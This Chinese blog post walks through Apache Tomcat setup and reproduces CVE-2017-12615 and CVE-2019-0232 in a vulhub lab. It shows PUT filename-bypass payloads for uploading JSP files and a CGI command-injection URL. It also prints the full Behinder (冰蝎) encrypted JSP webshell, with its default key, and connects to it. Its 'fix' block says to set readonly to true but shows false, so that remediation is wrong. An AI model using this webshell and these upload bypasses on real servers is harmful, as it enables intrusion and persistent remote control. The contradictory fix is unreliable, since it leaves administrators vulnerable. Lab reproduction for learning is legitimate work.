<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Tomcat">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat总结">
<meta property="og:url" content="http://example.com/2021/06/22/Tomcat/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Tomcat">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619271446048.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619263844479.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619263320303.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619275501351.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619276500737.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619276550079.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279493073.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279550159.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279602920.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279695848.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279779246.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280114887.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280208227.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280600919.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280689842.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281552614.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281576850.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281594138.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281681804.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316374088.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316427883.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316466768.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316534173.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316568424.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317164402.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317181551.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317197793.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317352951.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619326835356.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619326964457.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327075870.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327411223.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327400322.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327485133.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329013757.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329131808.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329484692.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329494731.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329569867.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329613901.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329717080.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329890433.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619339840138.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619339862773.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619339911577.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619332041600.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619340379288.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619340324001.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619340439690.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619340998143.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341538485.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341565301.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341609504.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341768817.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341811564.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342044653.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342139990.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342352290.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342430579.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342458443.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342481874.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619348867355.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619349787403.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619349894166.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350245468.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350478774.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350649495.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351018857.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351185840.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351175429.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351850151.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351998810.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352574611.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352504843.png">
<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352730021.png">
<meta property="article:published_time" content="2021-06-22T11:01:29.302Z">
<meta property="article:modified_time" content="2021-06-22T10:23:08.108Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Tomcat总结">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/1619271446048.png"><title>Tomcat总结 | Hexo</title><link ref="canonical" href="http://example.com/2021/06/22/Tomcat/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Tomcat总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-06-22</span></span></div></header><div class="post-body"><p><strong>Tomcat</strong></p>
<span id="more"></span>


        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="安装"   >
          <a href="#安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装" class="headerlink" title="安装"></a>安装</h2>
      <p>首先要有java的环境</p>
<p><strong>注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本</strong></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619271446048.png" alt="1619271446048"></p>
<p>然后安装Tomcat  一路默认下来 就ok了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619263844479.png" alt="1619263844479"></p>
<p>可以看到它的8080端口 已经开启了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619263320303.png" alt="1619263320303"></p>
<p>访问一下</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619275501351.png" alt="1619275501351"></p>

        <h2 id="Tomcat分析"   >
          <a href="#Tomcat分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat分析" class="headerlink" title="Tomcat分析"></a>Tomcat分析</h2>
      
        <h3 id="主要文件"   >
          <a href="#主要文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.server.xml：配置 tomcat启动的端口号、host主机、Context等</span><br><span class="line">2.web.xml:部署描述文件，这个web.xml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet </span><br><span class="line">3：tomcat-users.xml:tomcat的用户密码与权限。</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619276500737.png" alt="1619276500737"></p>

        <h3 id="上传目录"   >
          <a href="#上传目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#上传目录" class="headerlink" title="上传目录"></a>上传目录</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619276550079.png" alt="1619276550079"></p>

        <h2 id="Tomcat渗透"   >
          <a href="#Tomcat渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat渗透" class="headerlink" title="Tomcat渗透"></a>Tomcat渗透</h2>
      
        <h3 id="Tomcat任意文件写入-CVE-2017-12615）"   >
          <a href="#Tomcat任意文件写入-CVE-2017-12615）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat任意文件写入-CVE-2017-12615）" class="headerlink" title="Tomcat任意文件写入(CVE-2017-12615）"></a>Tomcat任意文件写入(CVE-2017-12615）</h3>
      
        <h4 id="影响范围"   >
          <a href="#影响范围" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4>
      <p>Apache Tomcat7.0.0-7.0.81（默认配置）</p>

        <h4 id="复现"   >
          <a href="#复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现" class="headerlink" title="复现"></a>复现</h4>
      <p>这边我用vulhub</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start </span><br><span class="line">cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279493073.png" alt="1619279493073"></p>
<p>去底层看看源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -ti a3 bash</span><br><span class="line">cat conf/web.xml |grep readonly</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279550159.png" alt="1619279550159"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279602920.png" alt="1619279602920"></p>

        <h4 id="漏洞原理"   >
          <a href="#漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4>
      <p>产生是由于配置不当（非默认配置），将配置文件<br>conf/web.xml）中的 readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法</p>

        <h4 id="开始复现"   >
          <a href="#开始复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h4>
      <p>抓包  改位PUT  上传方式</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279695848.png" alt="1619279695848"></p>
<p>去上传目录看看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619279779246.png" alt="1619279779246"></p>
<p>成功上传</p>

        <h5 id="绕过，成功上传jsp"   >
          <a href="#绕过，成功上传jsp" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过，成功上传jsp" class="headerlink" title="绕过，成功上传jsp"></a>绕过，成功上传jsp</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Windows下不允许文件以空格结尾</span><br><span class="line">以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格</span><br><span class="line">2.WindowsNTFS流</span><br><span class="line">Put/dayU1.jsp：：SdaTa Http/1.13./在文件名中是非法的，也会被去除（Linux/Windows）</span><br><span class="line">Put/dayu2.jsp/http:/1.1</span><br></pre></td></tr></table></div></figure>



<p>可以看到上传a001.jsp 是成功绕过了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280114887.png" alt="1619280114887"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280208227.png" alt="1619280208227"></p>
<p>其他两种我就不进行演示了 </p>
<p>都是可以的</p>
<p>上传马儿，这边我用冰蝎进行连接</p>
<p><strong>注意：不能开代理</strong></p>
<p>看看冰蝎server目录下的jsp马儿</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280600919.png" alt="1619280600919"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619280689842.png" alt="1619280689842"></p>
<p>冰蝎的jsp马儿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br></pre></td></tr></table></div></figure>



<p>注意这边要用<code>/</code>进行绕过,上传jsp</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281552614.png" alt="1619281552614"></p>
<p>也可以看到是成功上传的</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281576850.png" alt="1619281576850"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281594138.png" alt="1619281594138"></p>
<p>用冰蝎进行连接一下</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619281681804.png" alt="1619281681804"></p>

        <h5 id="最新版本复现"   >
          <a href="#最新版本复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#最新版本复现" class="headerlink" title="最新版本复现"></a>最新版本复现</h5>
      <p>这边把这个漏洞的代码 粘贴进最新的版本</p>
<p>不加的话  PUT 上传txt都是不可以的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"> &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"> &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316374088.png" alt="1619316374088"></p>
<p>保存退出 进行重启Tomcat</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316427883.png" alt="1619316427883"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316466768.png" alt="1619316466768"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316534173.png" alt="1619316534173"></p>
<p>确实是可以成功写入的</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619316568424.png" alt="1619316568424"></p>
<p>进行PUT写入txt 发现它是可以的</p>
<p>但是绕过，上传jsp  三种方法我都试了  是不行的</p>

        <h6 id="修复"   >
          <a href="#修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#修复" class="headerlink" title="修复"></a>修复</h6>
      <p>把readonly 改成true</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"> &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"> &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="Tomcat远程代码执行（CVE-2019-0232）"   >
          <a href="#Tomcat远程代码执行（CVE-2019-0232）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat远程代码执行（CVE-2019-0232）"></a>Tomcat远程代码执行（CVE-2019-0232）</h3>
      
        <h4 id="影响范围-1"   >
          <a href="#影响范围-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1 to 9.0.17</span><br><span class="line">Apache Tomcat 8.5.0 to 8.5.39</span><br><span class="line">Apache Tomcat 7.0.0 to 7.0.93</span><br></pre></td></tr></table></div></figure>



<p>这边就用 Windows 8.5.39 进行复现</p>

        <h4 id="安装-1"   >
          <a href="#安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4>
      <p>同样是先安装java</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317164402.png" alt="1619317164402"></p>
<p>然后安装Tomcat</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317181551.png" alt="1619317181551"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317197793.png" alt="1619317197793"></p>
<p>访问一下</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619317352951.png" alt="1619317352951"></p>

        <h4 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4>
      <p>Tomcat的 CGI_Servlet组件默认是关闭的，在<code>conf/web.xml</code>中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619326835356.png" alt="1619326835356"></p>
<p>就是配置这里</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;WEB-INF/cgi&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">	    &lt;param-name&gt;executable&lt;/param-name&gt;</span><br><span class="line">	    &lt;param-value&gt;&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></div></figure>



<p>这里主要的设置是enableCmdLineArguments和 executable两个选项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行</span><br><span class="line">2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。</span><br></pre></td></tr></table></div></figure>



<p>同样在conf/web.xml中启用cgi的 servlet-mapping</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619326964457.png" alt="1619326964457"></p>
<p>修改conf/context.xml的添加 privileged=”true”属性，否则会没有权限</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context privileged=&quot;true&quot;&gt;</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327075870.png" alt="1619327075870"></p>
<p>配置目录文件</p>
<p>在<code>C:\Tomcat\webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录</p>
<p>并在该目录下创建一个a001.txt</p>
<p>里面内容随意</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327411223.png" alt="1619327411223"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327400322.png" alt="1619327400322"></p>
<p>记得重启一下</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619327485133.png" alt="1619327485133"></p>
<p>然后我们访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.193:8080/cgi-bin/a001.bat?&amp;dir</span><br></pre></td></tr></table></div></figure>




        <h3 id="Tomcat弱口令-amp-后台getshell漏洞"   >
          <a href="#Tomcat弱口令-amp-后台getshell漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat弱口令-amp-后台getshell漏洞" class="headerlink" title="Tomcat弱口令&amp;后台getshell漏洞"></a>Tomcat弱口令&amp;后台getshell漏洞</h3>
      
        <h4 id="影响范围-2"   >
          <a href="#影响范围-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4>
      <p>Tomcat8</p>
<p>这边就还是用vulhub进行复现</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/tomcat/tomcat8</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619329013757.png" alt="1619329013757"></p>
<p>之前的容器要关掉</p>
<p>去docker底层看看它的源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -ti a bash</span><br><span class="line">cd conf</span><br></pre></td></tr></table></div></figure>

<p>把这三个文件复制出来</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/</span><br><span class="line">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/</span><br><span class="line">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/</span><br></pre></td></tr></table></div></figure>





